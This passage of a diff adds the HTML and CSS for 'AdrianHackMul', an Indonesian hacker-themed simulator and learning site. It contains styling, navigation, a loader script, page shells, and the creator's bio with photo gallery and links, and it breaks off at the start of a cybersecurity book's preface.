+.util-btn.alt{border-color:var(--accent);color:var(--accent)}
+.util-strength{height:6px;background:#111;border-radius:3px;overflow:hidden;margin-top:8px}
+.util-strength>div{height:100%;width:0;transition:.3s;background:var(--danger)}
+.util-strength-label{font-size:10px;color:var(--dim);margin-top:4px;letter-spacing:1px}
+.util-slider{flex:1;accent-color:var(--primary)}
+.util-checkbox{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--dim);cursor:pointer}
+.util-checkbox input{accent-color:var(--primary)}
+
+/* CTF */
+.ctf-wrap{max-width:820px;margin:0 auto}
+.ctf-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
+.ctf-stat{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:14px;text-align:center}
+.ctf-stat .l{font-size:9px;color:var(--dim);letter-spacing:2px;text-transform:uppercase}
+.ctf-stat .v{font-family:'Orbitron',monospace;font-size:22px;color:var(--primary);text-shadow:0 0 12px var(--glow);margin-top:4px}
+.ctf-card{background:linear-gradient(135deg,rgba(10,14,20,.95),rgba(5,10,15,.95));border:1px solid var(--primary);border-radius:14px;padding:26px;position:relative;overflow:hidden}
+.ctf-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--grad)}
+.ctf-q-num{font-size:10px;color:var(--accent);letter-spacing:2px;margin-bottom:10px}
+.ctf-q{font-size:14px;line-height:1.6;color:var(--text);margin-bottom:20px;font-weight:500}
+.ctf-q code{background:rgba(0,255,65,.1);color:var(--primary);padding:1px 7px;border-radius:4px;font-size:12px}
+.ctf-opts{display:flex;flex-direction:column;gap:9px;margin-bottom:16px}
+.ctf-opt{background:#000;border:1px solid var(--border);color:var(--text);padding:13px 16px;font-family:inherit;font-size:12px;text-align:left;cursor:pointer;border-radius:8px;display:flex;align-items:center;gap:12px}
+.ctf-opt:hover{border-color:var(--primary);background:var(--soft)}
+.ctf-opt .letter{width:24px;height:24px;border-radius:50%;background:var(--soft);color:var(--primary);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;border:1px solid rgba(0,255,65,.3)}
+.ctf-opt.correct{border-color:var(--primary);background:rgba(0,255,65,.15)}
+.ctf-opt.wrong{border-color:var(--danger);background:rgba(255,0,64,.15)}
+.ctf-opt:disabled{cursor:not-allowed}
+.ctf-feedback{padding:14px;border-radius:8px;font-size:12px;line-height:1.5;margin-bottom:14px;display:none}
+.ctf-feedback.show{display:block}
+.ctf-feedback.ok{border-left:3px solid var(--primary);background:rgba(0,255,65,.08);color:var(--primary)}
+.ctf-feedback.no{border-left:3px solid var(--danger);background:rgba(255,0,64,.08);color:var(--danger)}
+.ctf-actions{display:flex;gap:8px;flex-wrap:wrap}
+.ctf-done{text-align:center;padding:26px}
+.ctf-done h3{font-family:'Orbitron',monospace;color:var(--primary);font-size:22px;letter-spacing:3px;margin-bottom:14px}
+.ctf-done .rank{font-family:'Orbitron',monospace;font-size:32px;margin:16px 0}
+
+/* ABOUT */
+.about{display:grid;grid-template-columns:280px 1fr;gap:22px}
+@media(max-width:800px){.about{grid-template-columns:1fr}}
+.avatar{background:linear-gradient(135deg,rgba(10,14,20,.95),rgba(5,10,15,.95));border:1px solid var(--primary);border-radius:12px;padding:24px;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.avatar-init{font-family:'Orbitron',monospace;font-size:54px;font-weight:900;color:var(--primary);text-shadow:0 0 30px var(--glow);letter-spacing:4px;margin-bottom:14px;animation:pulse 3s ease-in-out infinite}
+.skill{margin-bottom:14px}
+.skill-n{display:flex;justify-content:space-between;font-size:11px;margin-bottom:5px;color:var(--dim)}
+.skill-n b{color:var(--primary)}
+.skill-b{height:6px;background:#111;border-radius:3px;overflow:hidden}
+.skill-b>div{height:100%;background:var(--grad);width:0;transition:width 1.5s}
+
+/* ACHIEVEMENT */
+.ach-toast{position:fixed;top:calc(72px + env(safe-area-inset-top,0px));right:16px;background:linear-gradient(135deg,rgba(0,0,0,.98),rgba(10,20,15,.98));border:2px solid var(--primary);border-radius:12px;padding:14px 20px;z-index:8600;box-shadow:0 0 30px var(--glow);display:flex;align-items:center;gap:14px;transform:translateX(420px);transition:.4s cubic-bezier(.34,1.56,.64,1);max-width:340px}
+.ach-toast.show{transform:translateX(0)}
+.ach-toast .ic{font-size:30px}
+.ach-toast .txt .t{font-family:'Orbitron',monospace;font-size:10px;color:var(--accent);letter-spacing:2px;margin-bottom:2px}
+.ach-toast .txt .n{font-size:13px;color:var(--primary);font-weight:700}
+
+/* MATRIX PANEL */
+#mpanel{position:fixed;right:16px;top:calc(72px + env(safe-area-inset-top,0px));z-index:5300;background:rgba(10,14,20,.97);border:1px solid var(--primary);border-radius:12px;padding:16px;min-width:270px;max-width:90vw;box-shadow:0 0 40px var(--soft);display:none}
+#mpanel.show{display:block}
+#mpanel h4{color:var(--primary);font-size:11px;letter-spacing:2px;margin-bottom:12px;border-bottom:1px solid var(--border);padding-bottom:8px;display:flex;justify-content:space-between;align-items:center}
+#mclose{background:transparent;border:1px solid var(--border);color:var(--dim);width:24px;height:24px;border-radius:5px;cursor:pointer;font-size:12px;padding:0}
+#mclose:hover{color:var(--danger);border-color:var(--danger)}
+.modes{display:grid;grid-template-columns:repeat(2,1fr);gap:5px;margin-bottom:10px}
+.mode{background:#000;border:1px solid var(--border);color:var(--dim);padding:6px 8px;font-family:inherit;font-size:10px;cursor:pointer;border-radius:5px}
+.mode:hover{color:var(--primary);border-color:var(--primary)}
+.mode.active{background:var(--soft);color:var(--primary);border-color:var(--primary)}
+.srow{display:flex;align-items:center;gap:10px;margin-bottom:8px;font-size:10px;color:var(--dim)}
+.srow input{flex:1;accent-color:var(--primary)}
+.srow b{color:var(--primary);min-width:28px;text-align:right}
+
+/* TOAST & GRANTED */
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:rgba(0,0,0,.96);border:1px solid var(--primary);color:var(--primary);padding:12px 22px;border-radius:8px;font-size:12px;z-index:8700;letter-spacing:1px;box-shadow:0 0 30px var(--glow);transition:.4s;max-width:90vw;text-align:center}
+#toast.show{transform:translateX(-50%) translateY(0)}
+#granted{position:fixed;inset:0;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;z-index:7000;padding:20px}
+#granted.show{display:flex}
+.gbox{background:#000;border:2px solid var(--primary);padding:36px 44px;border-radius:14px;text-align:center;box-shadow:0 0 60px var(--glow);max-width:420px;animation:pop .4s}
+@keyframes pop{0%{transform:scale(.7);opacity:0}100%{transform:scale(1);opacity:1}}
+.gbox h2{color:var(--primary);font-size:24px;letter-spacing:5px;font-family:'Orbitron',monospace;margin-bottom:12px}
+.gbox p{color:var(--dim);font-size:12px;letter-spacing:2px;margin-bottom:18px}
+
+/* DESKTOP */
+#hdesk{position:fixed;inset:0;background:radial-gradient(circle at 50% 30%,#0a1420,#000 70%);z-index:8500;display:none;overflow:hidden}
+#hdesk.active{display:block}
+.hd-top{position:absolute;top:0;left:0;right:0;height:30px;background:rgba(0,0,0,.9);border-bottom:1px solid rgba(0,255,65,.35);display:flex;align-items:center;justify-content:space-between;padding:0 12px;z-index:100;font-size:10px}
+.hd-top img{width:22px;height:22px;border-radius:50%;border:1px solid var(--primary)}
+.hd-top .hd-title{font-family:'Orbitron',monospace;letter-spacing:2px;color:var(--primary)}
+.hd-top .hd-right{display:flex;gap:10px;color:var(--accent);align-items:center}
+.hd-close{background:transparent;border:1px solid var(--danger);color:var(--danger);width:22px;height:22px;border-radius:5px;cursor:pointer;font-size:11px;display:flex;align-items:center;justify-content:center}
+.hd-close:hover{background:var(--danger);color:#000}
+#hdTerm{position:absolute;top:30px;left:0;right:0;bottom:0;padding:14px;overflow:hidden;z-index:0;font-size:11px;line-height:1.6;color:rgba(0,255,65,.55);white-space:pre-wrap;word-break:break-all}
+#hdDock{position:absolute;right:8px;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:8px;z-index:50}
+.hd-icon{width:56px;height:56px;background:rgba(0,0,0,.9);border:1px solid var(--primary);border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;position:relative}
+.hd-icon:hover{background:var(--soft);transform:scale(1.1)}
+.hd-icon .ico{font-size:22px}
+.hd-icon .lbl{font-size:7px;margin-top:2px;color:var(--accent);text-align:center;line-height:1.1}
+.hd-num{position:absolute;top:-4px;right:-4px;background:var(--primary);color:#000;font-size:8px;width:14px;height:14px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700}
+.hwin{position:absolute;background:rgba(0,10,5,.96);border:1px solid var(--primary);border-radius:8px;z-index:200;display:flex;flex-direction:column;min-width:240px;max-width:92vw}
+.hwin-head{background:linear-gradient(180deg,#0f2a18,#0a1a10);padding:8px 12px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(0,255,65,.3);cursor:move;border-radius:7px 7px 0 0}
+.hwin-title{font-size:11px;font-family:'Orbitron',monospace;letter-spacing:1.5px;color:var(--primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hwin-close{background:transparent;border:1px solid var(--danger);color:var(--danger);width:22px;height:22px;border-radius:4px;cursor:pointer;font-size:12px;padding:0}
+.hwin-close:hover{background:var(--danger);color:#000}
+.hwin-body{padding:14px;overflow-y:auto;flex:1;font-size:11px;line-height:1.6;color:var(--primary);max-height:60vh}
+.prog-bar{height:8px;background:#111;border:1px solid rgba(0,255,65,.3);border-radius:4px;overflow:hidden;margin:8px 0}
+.prog-fill{height:100%;width:0;background:var(--grad);transition:width .3s}
+.btc-value{font-family:'Orbitron',monospace;font-size:20px;color:var(--warning);margin:8px 0}
+.hash-stream{font-size:9px;color:rgba(0,255,65,.4);height:55px;overflow:hidden;word-break:break-all;margin-top:6px}
+.crack-log{font-size:9px;color:rgba(0,255,65,.5);height:80px;overflow-y:auto;margin-top:6px;white-space:pre-wrap}
+.cctv-feed{width:100%;height:170px;background:#111;border:1px solid rgba(0,255,65,.3);border-radius:6px;position:relative;display:flex;align-items:center;justify-content:center}
+.cctv-feed .emoji{font-size:60px}
+.cctv-label{position:absolute;top:8px;left:8px;font-size:9px;background:rgba(255,0,0,.75);color:#fff;padding:2px 7px;border-radius:4px}
+.cctv-time{position:absolute;bottom:8px;right:8px;font-size:9px;color:#fff;background:rgba(0,0,0,.75);padding:2px 7px;border-radius:4px}
+.hbtn{background:transparent;border:1px solid var(--primary);color:var(--primary);padding:6px 12px;font-family:inherit;font-size:10px;border-radius:5px;cursor:pointer;margin-top:8px}
+.hbtn:hover{background:var(--soft)}
+.hbtn.danger{border-color:var(--danger);color:var(--danger)}
+.nuke-circle{width:64px;height:64px;border-radius:50%;border:3px solid var(--warning);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:18px;color:var(--warning);flex-shrink:0}
+.face-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-top:10px}
+.face{aspect-ratio:1;background:#111;border:1px solid rgba(0,255,65,.2);border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:24px}
+.face.matched{border-color:var(--danger);background:rgba(255,0,64,.15)}
+.sat-map{width:100%;height:150px;background:#000;border:1px solid rgba(0,255,65,.3);border-radius:6px;position:relative;overflow:hidden;margin-top:8px}
+.sat-map .grid-lines{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,65,.1) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,.1) 1px,transparent 1px);background-size:20px 20px}
+.sat-dot{position:absolute;width:6px;height:6px;background:var(--primary);border-radius:50%;animation:ping 1.5s infinite}
+@keyframes ping{0%{transform:scale(.5);opacity:1}100%{transform:scale(2.5);opacity:0}}
+.deal-card{background:rgba(0,255,65,.05);border:1px solid rgba(0,255,65,.2);border-radius:6px;padding:10px;margin-bottom:8px}
+.deal-card:hover{border-color:var(--primary)}
+.deal-price{font-family:'Orbitron',monospace;color:var(--warning);font-size:16px}
+#hPopup{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) scale(.8);background:rgba(0,0,0,.96);border:2px solid var(--primary);padding:24px 40px;border-radius:12px;z-index:500;text-align:center;opacity:0;pointer-events:none;transition:.3s}
+#hPopup.show{opacity:1;transform:translate(-50%,-50%) scale(1)}
+#hPopup.denied{border-color:var(--danger)}
+#hPopup h3{font-family:'Orbitron',monospace;font-size:20px;letter-spacing:4px;margin-bottom:6px}
+#hPopup.denied h3{color:var(--danger)}
+#hPopup p{font-size:10px;color:#888;letter-spacing:2px}
+
+/* Responsif tambahan: ruang kerja desktop dan HP */
+.hd-icon{touch-action:manipulation;min-width:0}
+button,a,select,[role="button"]{touch-action:manipulation}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px}
+img{max-width:100%}
+@media(max-width:640px){
+  header{gap:8px;padding-left:10px;padding-right:10px}
+  .hd-right{gap:4px}
+  .hd-right button{padding:6px 7px}
+  .hd-brand{gap:7px}
+  .hd-brand img{width:30px;height:30px}
+  .hd-brand span{letter-spacing:1px}
+  #hdesk{overflow:hidden}
+  .hwin{max-width:calc(100vw - 20px)!important;max-height:calc(100dvh - 90px);overflow:auto}
+  .hwin-body{max-height:calc(100dvh - 150px);overflow:auto}
+  .hd-dock{gap:6px}
+  .hd-icon{min-height:72px}
+  .hd-icon .lbl{font-size:9px}
+  .hd-right select{display:none}
+  .hd-brand span{font-size:13px}
+  .hero-btns .btn{padding:10px 16px;font-size:10px}
+  .term-b{height:440px;font-size:12px;padding:12px}
+  #mpanel{right:10px;left:10px;min-width:auto}
+  .cmd-list{grid-template-columns:1fr;max-height:480px}
+  .ach-toast{left:12px;right:12px;max-width:none;top:calc(70px + env(safe-area-inset-top,0px));transform:translateY(-150px)}
+  .ach-toast.show{transform:translateY(0)}
+  .ctf-stats{grid-template-columns:1fr 1fr 1fr}
+  .ctf-stat .v{font-size:16px}
+  .prompt,#tInput,.t-text{font-size:12px}
+}
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;scroll-behavior:auto!important;transition-duration:.01ms!important}
+}
+</style>
+</head>
+<body data-theme="green">
+
+<canvas id="matrix"></canvas>
+<div class="orb o1"></div><div class="orb o2"></div>
+<div class="fx-noise"></div>
+<div class="scanlines"></div>
+
+<!-- LOADER -->
+<div id="loader">
+  <div class="load-ring">
+    <div class="load-pulse"></div>
+    <img class="load-img" src="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg" alt="logo" onerror="this.style.display='none'">
+  </div>
+  <div class="load-name">ADRIANHACKMUL</div>
+  <div class="load-bar"><div class="load-fill" id="ldFill"></div></div>
+  <div class="load-stat" id="ldStat">BOOTING SYSTEM <span class="blink">_</span></div>
+</div>
+
+<!-- SAFETY NET -->
+<script>
+(function(){
+  function hide(){
+    var l=document.getElementById('loader');
+    if(l&&!l.classList.contains('hide')){
+      l.classList.add('hide');
+      setTimeout(function(){
+        var g=document.getElementById('granted');
+        if(g&&!g.classList.contains('show')) g.classList.add('show');
+      },300);
+    }
+  }
+  window.__hideLoader=hide;
+  window.addEventListener('error',function(e){
+    console.error('[AHM Error]',e.message,'@',e.lineno+':'+e.colno);
+    hide();
+  });
+  window.addEventListener('unhandledrejection',function(e){
+    console.error('[AHM Promise]',e.reason);
+    hide();
+  });
+  setTimeout(hide,4000);
+})();
+</script>
+
+<!-- HEADER -->
+<header>
+  <button id="burger" aria-label="Menu"><span></span><span></span><span></span></button>
+  <div class="hd-brand">
+    <img src="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg" alt="logo" onerror="this.style.display='none'">
+    <span>AdrianHackMul</span>
+  </div>
+  <div class="hd-right">
+    <select id="theme">
+      <option value="green">🟢 GREEN</option><option value="red">🔴 RED</option><option value="blue">🔵 BLUE</option>
+      <option value="amber">🟡 AMBER</option><option value="purple">🟣 PURPLE</option><option value="pink">🌸 PINK</option>
+    </select>
+    <button id="sound" class="active">🔊</button>
+    <button id="mtoggle">MATRIX</button>
+    <button id="installBtn">⬇ INSTALL</button>
+  </div>
+</header>
+
+<div id="overlay"></div>
+
+<aside id="drawer">
+  <div class="drawer-head">
+    <img src="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg" alt="logo" onerror="this.style.display='none'">
+    <div class="info"><div class="t">AdrianHackMul</div><div class="s">OPERATOR ONLINE</div></div>
+  </div>
+  <div class="drawer-section">MAIN</div>
+  <div class="drawer-nav">
+    <div class="dnav active" data-page="home"><span class="ic">🏠</span><span class="lb">HOME</span></div>
+    <div class="dnav" data-page="dashboard"><span class="ic">📊</span><span class="lb">DASHBOARD</span></div>
+    <div class="dnav" data-page="terminal"><span class="ic">💻</span><span class="lb">TERMINAL</span></div>
+    <div class="dnav" data-page="tools"><span class="ic">🧰</span><span class="lb">TOOLS</span></div>
+  </div>
+  <div class="drawer-section">LEARNING</div>
+  <div class="drawer-nav">
+    <div class="dnav" data-page="learn"><span class="ic">📚</span><span class="lb">LEARNING</span></div>
+    <div class="dnav" data-page="book"><span class="ic">📖</span><span class="lb">BUKU CYBER</span><span class="bg">NEW</span></div>
+    <div class="dnav" data-page="commands"><span class="ic">⌨️</span><span class="lb">COMMANDS</span><span class="bg" id="cmdBadge">0</span></div>
+    <div class="dnav" data-page="ctf"><span class="ic">🎯</span><span class="lb">CTF QUIZ</span></div>
+  </div>
+  <div class="drawer-section">UTILITIES</div>
+  <div class="drawer-nav">
+    <div class="dnav" data-page="utils"><span class="ic">🔧</span><span class="lb">CYBER UTILS</span></div>
+    <div class="dnav" data-page="desktop"><span class="ic">🖥️</span><span class="lb">DESKTOP MODE</span><span class="bg">NEW</span></div>
+  </div>
+  <div class="drawer-section">INFO</div>
+  <div class="drawer-nav">
+    <div class="dnav" data-page="about"><span class="ic">👤</span><span class="lb">ABOUT</span></div>
+  </div>
+  <div class="drawer-foot"><b>AdrianHackMul</b> v12<br><span style="font-size:9px;opacity:.7">Simulation Only</span></div>
+</aside>
+
+<!-- MATRIX PANEL -->
+<div id="mpanel">
+  <h4>⚙ MATRIX CONFIG <button id="mclose">✕</button></h4>
+  <div class="modes" id="modes">
+    <button class="mode active" data-m="classic">CLASSIC</button>
+    <button class="mode" data-m="binary">BINARY</button>
+    <button class="mode" data-m="hex">HEX</button>
+    <button class="mode" data-m="katakana">KATAKANA</button>
+    <button class="mode" data-m="hiragana">HIRAGANA</button>
+    <button class="mode" data-m="cyrillic">CYRILLIC</button>
+    <button class="mode" data-m="dna">DNA</button>
+    <button class="mode" data-m="emoji">EMOJI</button>
+    <button class="mode" data-m="math">MATH</button>
+    <button class="mode" data-m="rainbow">RAINBOW</button>
+    <button class="mode" data-m="custom">CUSTOM</button>
+    <button class="mode" data-m="mixed">MIXED</button>
+  </div>
+  <div class="srow"><span>SPEED</span><input type="range" id="mSpd" min="10" max="120" value="33"><b id="mSpdV">33</b></div>
+  <div class="srow"><span>DENSITY</span><input type="range" id="mDen" min="1" max="3" step="0.1" value="1"><b id="mDenV">1</b></div>
+  <div class="srow"><span>SIZE</span><input type="range" id="mSz" min="10" max="30" value="16"><b id="mSzV">16</b></div>
+  <div class="srow"><span>OPACITY</span><input type="range" id="mOp" min="10" max="100" value="55"><b id="mOpV">55</b></div>
+</div>
+
+<main>
+
+<!-- HOME -->
+<div class="page active" id="page-home">
+  <div class="hero-wrap">
+    <img class="hero-logo" src="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg" alt="logo" onerror="this.style.display='none'">
+    <h1 class="hero-title">AdrianHackMul</h1>
+    <p class="hero-sub">[ Ultimate Hacker Simulator + Learning ]</p>
+    <div class="hero-btns">
+      <button class="btn" onclick="go('desktop')">🖥 ENTER DESKTOP</button>
+      <button class="btn alt" onclick="go('book')">📖 BUKU CYBER</button>
+    </div>
+    <div class="status">
+      <span>IP: <b id="sIP">---</b></span><span>PING: <b id="sPing">--ms</b></span>
+      <span>CPU: <b id="sCPU">--%</b></span><span>RAM: <b id="sRAM">--%</b></span>
+      <span>ENC: <b>AES-256</b></span><span>VPN: <b style="color:var(--primary)">● ACTIVE</b></span>
+      <span>TIME: <b id="sTime">--:--:--</b></span>
+    </div>
+
+  </div>
+
+  <!-- BIO ARTICLE -->
+  <div style="max-width:820px;margin:40px auto 20px;padding:0 20px">
+    <div class="panel" style="padding:28px">
+      <p style="font-family:'Orbitron',monospace;font-size:11px;color:#ffffff;letter-spacing:2px;opacity:.7;margin-bottom:10px;text-align:center">— ARTIKEL SINGKAT DARI PEMBUAT WEBSITE —</p>
+      <h2 style="font-family:'Orbitron',monospace;font-size:clamp(14px,3.2vw,17px);color:#ffffff;letter-spacing:1px;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:12px;text-align:center">Muhammad Adrian, Mahasiswa ITS NU Sriwijaya Sumsel dan Santri Ma’had Tahfidz Qur’an Darussalam</h2>
+      <div style="color:#ffffff;font-size:13px;line-height:1.85">
+        <p style="margin-bottom:14px">Muhammad Adrian adalah mahasiswa Program Studi Informatika di Institut Teknologi dan Sains Nahdlatul Ulama Sriwijaya Sumatera Selatan (ITS NU Sriwijaya Sumsel). Selain itu, ia juga merupakan santri di Ma’had Tahfidz Qur’an Darussalam yang berada di Sumatera Selatan.</p>
+        <p style="margin-bottom:14px">Sebagai mahasiswa Informatika, Adrian belajar tentang pemrograman, pengembangan perangkat lunak, sistem informasi, dan teknologi digital. Sementara di ma’had, ia fokus menghafal Al-Qur’an dan mengikuti pembinaan santri sehari-hari.</p>
+        <p style="margin-bottom:14px">Menjalani dua peran sekaligus menuntut kedisiplinan dan manajemen waktu yang baik. Di satu sisi ia mengikuti perkuliahan dan praktik di kampus, di sisi lain ia tetap menjaga hafalan dan kegiatan di pesantren.</p>
+        <p style="margin-bottom:14px">Kombinasi belajar teknologi di ITS NU Sriwijaya Sumsel dan menghafal Al-Qur’an di Ma’had Tahfidz Qur’an Darussalam menjadi bekal yang saling melengkapi. Ilmu dunia dan ilmu agama dijalankan bersamaan.</p>
+        <p style="margin-bottom:14px">Semoga perjalanan Muhammad Adrian sebagai mahasiswa sekaligus santri berjalan lancar dan bermanfaat...Aamiin Bantu doa ya 😍🙏</p>
+        <p style="margin-top:18px;opacity:.7;font-size:12px;text-align:center">— Terima kasih telah membaca —</p>
+      </div>
+    </div>
+
+    <!-- PHOTO GALLERY -->
+    <div class="panel" style="padding:22px;margin-top:20px">
+      <h3 style="font-family:'Orbitron',monospace;font-size:14px;color:#ffffff;letter-spacing:2px;margin-bottom:16px;border-bottom:1px solid var(--border);padding-bottom:10px">📷 GALERI FOTO</h3>
+      <div class="gallery-grid" style="display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;justify-items:stretch;width:100%">
+        <div class="g-item" onclick="openLightbox(this)" data-src="https://i.ibb.co.com/VcG6mW30/IMG-20260912-WA0025.jpg">
+          <img src="https://i.ibb.co.com/VcG6mW30/IMG-20260912-WA0025.jpg" alt="Foto 1" loading="lazy" onerror="this.parentElement.style.display='none'">
+        </div>
+        <div class="g-item" onclick="openLightbox(this)" data-src="https://i.ibb.co.com/kTvzgM4/IMG-20260912-WA0026.jpg">
+          <img src="https://i.ibb.co.com/kTvzgM4/IMG-20260912-WA0026.jpg" alt="Foto 2" loading="lazy" onerror="this.parentElement.style.display='none'">
+        </div>
+        <div class="g-item" onclick="openLightbox(this)" data-src="https://i.ibb.co.com/jx6mKPP/IMG-20260912-WA0013.jpg">
+          <img src="https://i.ibb.co.com/jx6mKPP/IMG-20260912-WA0013.jpg" alt="Foto 3" loading="lazy" onerror="this.parentElement.style.display='none'">
+        </div>
+        <div class="g-item" onclick="openLightbox(this)" data-src="https://i.ibb.co.com/qHTMScZ/Proyek-Baru-10-DDAF608.png">
+          <img src="https://i.ibb.co.com/qHTMScZ/Proyek-Baru-10-DDAF608.png" alt="Foto 4" loading="lazy" onerror="this.parentElement.style.display='none'">
+        </div>
+        <div class="g-item" onclick="openLightbox(this)" data-src="https://i.ibb.co.com/5XmyDJvd/Proyek-Baru-10-86-A9446.png">
+          <img src="https://i.ibb.co.com/5XmyDJvd/Proyek-Baru-10-86-A9446.png" alt="Foto 5" loading="lazy" onerror="this.parentElement.style.display='none'">
+        </div>
+      </div>
+    </div>
+
+    <!-- LINKS -->
+    <div class="panel" style="padding:22px;margin-top:20px">
+      <h3 style="font-family:'Orbitron',monospace;font-size:14px;color:#ffffff;letter-spacing:2px;margin-bottom:16px;border-bottom:1px solid var(--border);padding-bottom:10px">🔗 TAUTAN RESMI</h3>
+      <div style="display:flex;flex-direction:column;gap:12px">
+        <a href="https://itsnusriwijaya.ac.id/" target="_blank" rel="noopener" class="link-card">
+          <span class="link-icon">🌐</span>
+          <div><div class="link-title">Website ITS NU Sriwijaya</div><div class="link-url">itsnusriwijaya.ac.id</div></div>
+        </a>
+        <a href="https://www.instagram.com/itsnusriwijaya" target="_blank" rel="noopener" class="link-card">
+          <span class="link-icon">📸</span>
+          <div><div class="link-title">Instagram ITS NU Sriwijaya</div><div class="link-url">@itsnusriwijaya</div></div>
+        </a>
+        <a href="https://www.instagram.com/mahad_tahfidzdarussalam/" target="_blank" rel="noopener" class="link-card">
+          <span class="link-icon">📖</span>
+          <div><div class="link-title">IG Ma’had Tahfidz Qur’an Darussalam</div><div class="link-url">@mahad_tahfidzdarussalam</div></div>
+        </a>
+        <a href="https://www.facebook.com/mahad.darussalam.1/" target="_blank" rel="noopener" class="link-card">
+          <span class="link-icon">📘</span>
+          <div><div class="link-title">Facebook Ma’had Tahfidz Qur’an Darussalam</div><div class="link-url">facebook.com/mahad.darussalam.1</div></div>
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LIGHTBOX -->
+<div id="lightbox" onclick="closeLightbox()">
+  <img id="lightboxImg" src="" alt="Preview">
+  <button id="lightboxClose" onclick="closeLightbox()">✕</button>
+</div>
+
+<!-- DASHBOARD -->
+<div class="page" id="page-dashboard">
+  <h2 class="sec-title">Control Dashboard</h2>
+  <p class="sec-sub">// Real-time simulation overview</p>
+  <div class="stats">
+    <div class="stat"><div class="stat-l">◆ Packets/sec</div><div class="stat-v" id="stP">0</div><div class="stat-d" id="stPD">▲ +0.0%</div><div class="bar"><div id="stPB"></div></div></div>
+    <div class="stat"><div class="stat-l">◆ Nodes</div><div class="stat-v" id="stN">0</div><div class="stat-d">🌐 Global</div><div class="bar"><div id="stNB"></div></div></div>
+    <div class="stat"><div class="stat-l">◆ Encryption</div><div class="stat-v">99.8%</div><div class="stat-d">🔒 AES-256-GCM</div><div class="bar"><div style="width:99.8%"></div></div></div>
+    <div class="stat"><div class="stat-l">◆ Threat Level</div><div class="stat-v" id="stT" style="color:var(--warning)">LOW</div><div class="stat-d">🛡 Secure</div><div class="bar"><div style="width:18%;background:var(--warning)"></div></div></div>
+  </div>
+  <div class="charts">
+    <div class="chart-panel"><div class="panel-title">Network Traffic <span style="color:var(--accent)">● LIVE</span></div><canvas id="lineC" width="600" height="200"></canvas></div>
+    <div class="chart-panel"><div class="panel-title">Skill Matrix</div><canvas id="radarC" width="300" height="220"></canvas></div>
+  </div>
+  <div class="panel">
+    <div class="panel-title">System Log <span class="blink" style="color:var(--primary)">●</span></div>
+    <div class="log" id="log"></div>
+  </div>
+</div>
+
+<!-- TERMINAL -->
+<div class="page" id="page-terminal">
+  <h2 class="sec-title">Interactive Terminal</h2>
+  <p class="sec-sub">// Real bash • TAB autocomplete • ↑↓ history • nano & python built-in</p>
+  <div class="term">
+    <div class="term-h">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="term-t" id="termTitle">adrian@hackmul: ~ — bash</span>
+    </div>
+    <div class="term-b" id="tBody">
+      <div id="tOut"></div>
+      <div class="t-input-line" id="tInputLine">
+        <span class="prompt" id="tPrompt"></span>
+        <div class="t-field">
+          <span class="t-text" id="tText"></span><span class="t-cursor"></span>
+          <input id="tInput" autocomplete="off" spellcheck="false" autocapitalize="off" autocorrect="off">
+        </div>
+        <div id="ac"></div>
+      </div>
+    </div>
+    <div id="nanoEditor">
+      <div class="nano-head" id="nanoTitle">  GNU nano 7.2</div>
+      <div class="nano-body"><textarea id="nanoText" spellcheck="false"></textarea></div>
+      <div class="nano-foot"><span><b>^O</b> Save</span><span><b>^X</b> Exit</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- TOOLS -->
+<div class="page" id="page-tools">
+  <h2 class="sec-title">Hacker Tools Suite</h2>
+  <p class="sec-sub">// Semua tools SIMULASI — klik untuk demo</p>
+  <div class="tools" id="toolsGrid"></div>
+</div>
+
+<!-- LEARN -->
+<div class="page" id="page-learn">
+  <h2 class="sec-title">📚 Learning Center</h2>
+  <p class="sec-sub">// Tutorial dari pemula sampai advanced</p>
+  <div class="learn-grid" id="learnGrid"></div>
+</div>
+
+<!-- BOOK -->
+<div class="page" id="page-book">
+  <h2 class="sec-title">📖 Buku Cybersecurity</h2>
+  <p class="sec-sub">// Cybersecurity dan Dunia Hacker — Edisi Lengkap</p>
+  <div class="book-wrap">
+    <h1>CYBERSECURITY DAN DUNIA HACKER</h1>
+    <p class="book-sub">Memahami Ancaman, Memperkuat Pertahanan, dan Membangun Budaya Keamanan Siber</p>
+
+    <h2>KATA PENGANTAR</h2>
